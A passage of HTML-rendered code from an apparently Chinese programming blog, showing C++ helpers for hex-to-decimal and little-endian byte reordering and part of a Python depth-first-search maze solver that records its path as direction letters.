punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>    <span class="token comment">// 处理0-9</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>        sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span>length<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        index<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr><h1 id="小端序-int-型-逆向-int-amp-char-型数组"><a href="#小端序-int-型-逆向-int-amp-char-型数组" class="headerlink" title="小端序 int 型 - 逆向 int &amp; char 型数组"></a>小端序 int 型 - 逆向 int &amp; char 型数组</h1><h2 id="C-版-1"><a href="#C-版-1" class="headerlink" title="C++版"></a>C++版</h2><hr><ul><li><strong>特点</strong>  <ol><li><strong>将小端序存放的 int型 数据转换为正序</strong>，并将结果存放到 int型 的 buffer数组 中 </li><li><mark>若 num 位数超长，将类型改为 <em>int64</em></mark></li><li><mark>若要保存到 <em>char</em> 数组，直接将 <em>int buffer</em> 改为 <em>char buffer</em> 即可</mark></li></ol></li></ul><hr><ul><li><strong>参数</strong>  </li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">意义</th></tr></thead><tbody><tr><td style="text-align:left"><code>num</code></td><td style="text-align:left">小端序存放的 <code>int</code> 型数据</td></tr><tr><td style="text-align:left"><code>width_num</code></td><td style="text-align:left">小端序存放的 <code>int</code> 型数据对应的 十六进制数 去掉 <code>&#39;0x&#39;</code> 后的长度<br></td></tr><tr><td style="text-align:left"><code>buffer</code></td><td style="text-align:left">用来保存处理结果的 <code>int</code> 型 数组 <code>buffer[]</code>，<code>buffer[]</code> 是 <code>num</code> 的逆向顺序</td></tr><tr><td style="text-align:left"><code>buffer_length</code></td><td style="text-align:left"><code>buffer[]</code> 的长度，可根据 <code>width_num / width_buffer</code>得出</td></tr><tr><td style="text-align:left"><code>width_buffer</code></td><td style="text-align:left"><code>buffer[]</code> 的每一个元素需要存放的 <code>num</code> 中的 十六进制数 的个数，即：将 <code>num</code> 分成 <code>width_buffer</code> 个 十六进制数 为一组</td></tr></tbody></table></div><hr><ul><li><strong>头文件</strong><ol><li><code>#include &lt;sstream&gt;</code></li></ol></li></ul><hr><ul><li><strong>代码</strong><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">little_endian</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width_num<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token keyword">int</span> buffer_length<span class="token punctuation">,</span> <span class="token keyword">int</span> width_buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>    std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>    ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>    ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>width_num <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width_num <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>        s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width_num<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> index <span class="token operator">+</span> width_buffer <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> index <span class="token operator">+=</span> width_buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> tmp<span class="token punctuation">[</span>width_buffer<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> width_buffer<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 将width_buffer长度的字符串转换为十进制数，存放到sum</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>    <span class="token comment">// 处理0-9</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>            sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span>width_buffer<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        index <span class="token operator">=</span> index <span class="token operator">-</span> width_buffer<span class="token punctuation">;</span>   <span class="token comment">// 因为前面修改了index，后面还要用index控制循环，所以这里将其还原</span>        buffer<span class="token punctuation">[</span>buffer_length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> sum<span class="token punctuation">;</span>  <span class="token comment">// 将十进制数sum逆向存储到 buffer[]</span>        buffer_length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr><h1 id="小端序-int-型-逆向-string-型字符串"><a href="#小端序-int-型-逆向-string-型字符串" class="headerlink" title="小端序 int 型 - 逆向 string 型字符串"></a>小端序 int 型 - 逆向 string 型字符串</h1><h2 id="C-版-2"><a href="#C-版-2" class="headerlink" title="C++版"></a>C++版</h2><hr><ul><li><strong>特点</strong><ol><li><strong>将小端序存放的 int型 数据转换为正序</strong>，并将结果存放到 string字符串 buffer 中</li><li><mark>若 num 位数超长，将类型改为 <strong>int64</strong></mark></li></ol></li></ul><hr><ul><li>参数：</li></ul><div class="table-container"><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td><code>num</code></td><td>小端序存放的 <code>int</code> 型数</td></tr><tr><td><code>width_num</code></td><td>小端序存放的 <code>int</code> 型数据对应的 十六进制数 除去 <code>&#39;0x&#39;</code> 后的长度</td></tr><tr><td><code>buffer</code></td><td>字符串 <code>buffer</code> 的长度，可根据 <code>width_num / width_buffer</code> 得出</td></tr><tr><td><code>width_buffer</code></td><td><code>buffer[]</code> 的每一个元素需要存放的 <code>num</code> 中的 十六进制数 的个数，即：将 <code>num</code> 分成 <code>width_buffer</code> 个 十六进制数 为一组</td></tr></tbody></table></div><hr><ul><li><strong>头文件</strong><ol><li><code>#include &lt;sstream&gt;</code></li></ol></li></ul><hr><ul><li><strong>代码</strong><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">string <span class="token function">little_endian</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width_num<span class="token punctuation">,</span> <span class="token keyword">int</span> buffer_length<span class="token punctuation">,</span> <span class="token keyword">int</span> width_buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>    std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>    ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>    ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>width_num <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width_num <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>        s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width_num<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span>    string buffer <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> index <span class="token operator">=</span> width_num<span class="token punctuation">;</span> index <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">;</span> index <span class="token operator">-=</span> width_buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> tmp<span class="token punctuation">[</span>width_buffer<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> width_buffer<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 将width_buffer长度的字符串转换为十进制数，存放到sum</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>    <span class="token comment">// 处理0-9</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>            sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span>width_buffer<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        index <span class="token operator">=</span> index <span class="token operator">-</span> width_buffer<span class="token punctuation">;</span>   <span class="token comment">// 因为前面修改了index，后面还要用index控制循环，所以这里将其还原</span>        buffer <span class="token operator">+=</span> sum<span class="token punctuation">;</span>  <span class="token comment">// 将字符sum逆向存储到 buffer字符串</span>        buffer_length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> buffer<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr><h1 id="走迷宫"><a href="#走迷宫" class="headerlink" title="走迷宫"></a>走迷宫</h1><h2 id="Python版-1"><a href="#Python版-1" class="headerlink" title="Python版"></a>Python版</h2><hr><ul><li><strong>特点</strong><ol><li>给出迷宫，起始位置和终点位置，输出走迷宫的路径</li><li>迷宫中 0 代表路，1 代表墙壁</li></ol></li></ul><hr><ul><li><strong>代码</strong><pre class="line-numbers language-python" data-language="python"><code class="language-python">maze <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    usedmap <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment"># 生成与迷宫相同规格的全0列表，用来记录已经走过的位置  </span>  sti <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 初始位置的横坐标  </span>stj <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 初始位置的纵坐标  </span>edi <span class="token operator">=</span> <span class="token number">5</span>  <span class="token comment"># 终点位置的横坐标  </span>edj <span class="token operator">=</span> <span class="token number">5</span>  <span class="token comment"># 终点位置的纵坐标  </span>flag <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 走迷宫  </span>    <span class="token keyword">global</span> flag      <span class="token keyword">if</span> x <span class="token operator">==</span> edi <span class="token keyword">and</span> y <span class="token operator">==</span> edj<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>          <span class="token keyword">return</span>      <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往下走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'s'</span>  <span class="token comment"># 向下走，记录路径  </span>        dfs<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往上走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'w'</span>  <span class="token comment"># 向上走，记录路径  </span>        dfs<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往右走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'d'</span>  <span class="token comment"># 向右走，记录路径  </span>        dfs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token 